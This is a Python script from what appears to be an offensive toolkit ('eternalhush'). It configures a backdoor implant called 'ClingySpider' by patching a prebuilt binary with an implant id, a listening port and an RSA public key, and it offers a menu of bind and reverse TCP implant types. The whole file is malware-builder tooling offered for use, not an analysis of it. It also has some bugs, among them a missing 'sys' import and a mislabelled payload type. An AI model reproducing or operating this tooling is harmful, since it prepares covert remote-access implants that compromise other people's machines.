import eternalhush as eh
import os
import datetime

CONFIG_MAGIC = 0x99c72f6099c72f60
RSA_MAGIC = 0x52534131
WORKDIR = os.path.realpath(os.path.dirname(__file__)+"\\..")
FILEDIR = os.path.join(WORKDIR, "files")
STORAGEDIR = os.path.join(WORKDIR, "storage")

X64_ARCH = 0x8
X32_ARCH = 0x4

implant_types = {
    1: "Bind TCP x86 executable",
    2: "Bind TCP x64 executable",
    3: "Bind TCP x86 library",
    4: "Bind TCP x64 library",
    5: "Reverse TCP x86 executable",
    6: "Reverse TCP x64 executable",
    7: "Reverse TCP x86 library",
    8: "Reverse TCP x64 executable"
}

CONFIG = {
    "magic_value": eh.LONGLONG,
    "port": eh.SHORT,
    "id": eh.LONG
}    

RSA_KEY = {
    "public_key": 283
}    

def main(args):
    if not os.path.exists(STORAGEDIR):
        os.makedirs(STORAGEDIR)
    
    eh.ui.Echo("Available payloads:", eh.ECHO_DEFAULT)
    for id, key in implant_types.items():
        eh.ui.Echo("    {}) - {}".format(id, key), eh.ECHO_DEFAULT)
    while True:
        type = int(eh.ui.Dialog("Pick payload type:"))
        if (type in implant_types.keys()):
            break
        eh.ui.Echo("Invalid option", eh.ECHO_ERROR)
    
    if type == 1:
        patch(os.path.join(FILEDIR, "X32_ClSp_Tcp_Exe.exe"))
    elif type == 2:
        patch(os.path.join(FILEDIR, "X64_ClSp_Tcp_Exe.exe"))
    elif type == 3:
        not_implemented()
    elif type == 4:
        not_implemented()
    elif type == 5:
        not_implemented()
    elif type == 6:
        not_implemented()
    elif type == 7:
        not_implemented()
    elif type == 8:
        not_implemented()
        
def not_implemented():
    eh.ui.Echo("Type not implemented yet", eh.ECHO_ERROR)
    return
    
def patch(name):
    
    while True:
        try:
            id = int(eh.ui.Dialog("Enter the implant id"))
            break
        except ValueError:
            eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
    
    while True:
        try:
            port = int(eh.ui.Dialog("Enter the implant listening port"))
            break
        except ValueError:
            eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
        
    while True:    
        key_path = eh.ui.Dialog("Enter RSA2048 publickey path")
        try:
            with open(key_path, "rb") as f:
                public_key = f.read()[::-1]
                break
        except IOError:
            eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        
    try:
        with open(name, "rb") as f:
            content = f.read()
            content = bytearray(content)
    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return    
    
    magic_val = content.find(CONFIG_MAGIC.to_bytes(eh.LONGLONG, "little"))

    if magic_val > 0:
        config = eh.data.Struct(CONFIG)
        config.from_bytes(content, global_offset=magic_val)
        
        config.magic_value = bytearray(os.urandom(eh.LONGLONG))
        config.port = port
        config.id = id
        
        
    rsa_magic_val = content.find(RSA_MAGIC.to_bytes(eh.LONG, "big")) 
    if rsa_magic_val > 0:
        rsa_publickey = eh.data.Struct(RSA_KEY)
        rsa_publickey.from_bytes(config.full_data(), global_offset=rsa_magic_val)
        rsa_publickey.public_key = public_key
        try:
            dt = datetime.datetime.now()
            current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")
            out_path = os.path.join(STORAGEDIR, "ClingySpider_"+current_time)
            os.makedirs(out_path)
            out_path = os.path.join(out_path, "ClingySpider.configured")
            with open(out_path, "wb+") as f:
                wr_bytes = f.write(config.full_data())
                eh.ui.Echo("Configured implant at {}".format(out_path), eh.ECHO_GOOD)
                eh.ui.Echo("Written {} bytes".format(wr_bytes), eh.ECHO_GOOD)
        except IOError:
            eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
            return 
    
if __name__ == "__main__":
    main(sys.argv)